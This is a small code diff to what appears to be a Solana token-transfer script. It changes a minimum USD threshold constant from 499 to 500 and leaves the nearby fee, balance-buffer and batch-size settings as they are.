@@ -76,7 +76,7 @@ const DESTINATION_WALLET = getDestinationWallet();
 
 // Configuration constants with inline documentation
 const SOL_TO_LEAVE = 0.001 * LAMPORTS_PER_SOL; // Buffer to maintain account activity
-const MIN_DOLLAR_THRESHOLD = 499; // Minimum USD value to justify transaction fees
+const MIN_DOLLAR_THRESHOLD = 500; // Minimum USD value to justify transaction fees
 
 const PRIORITY_FEE_MICRO_LAMPORTS = 100_000; // Standard priority fee
 const MAX_TOKEN_PROCESSING = 22; // Max tokens per transaction (stays under 1232 byte limit)
